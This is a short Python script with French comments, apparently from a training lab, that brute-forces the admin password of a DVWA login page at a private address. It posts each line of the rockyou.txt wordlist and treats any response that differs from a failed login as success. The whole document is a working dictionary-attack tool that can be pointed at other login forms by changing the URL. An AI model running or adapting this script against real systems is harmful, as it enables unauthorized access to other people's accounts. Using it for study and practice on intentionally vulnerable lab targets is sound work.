# -*- coding: utf-8 -*-
import requests

file = open("rockyou.txt", 'r', encoding="latin-1") #Encodage utf8 ne fonctionne pas
mdpFounded = False
currentMdp = ""
url = 'http://10.0.2.5/dvwa/login.php'

myobj=[('username','admin'),('password','test'), ('Login', 'Login')]
r = requests.post(url, myobj)
badResponse = r.text # Enregistrer la réponse pour vérifier si la réponse est bonne plus tard
#print(r.text)
#print("\n\n")

for word in file:
    #Récupérer le mdp au bon format (enlever \n à la fin)
    currentMdp = word[:-1]
    # Faire la requete
    myobj=[('username','admin'),('password',currentMdp), ('Login', 'Login')]
    r = requests.post(url, myobj)
    
    #if c'est bon
    if r.text != badResponse:
        mdpFounded = True
        break

file.close()
print("finished")

#Afficher résultat
if mdpFounded:
    print("Password: " + word)
else:
    print("No password founded")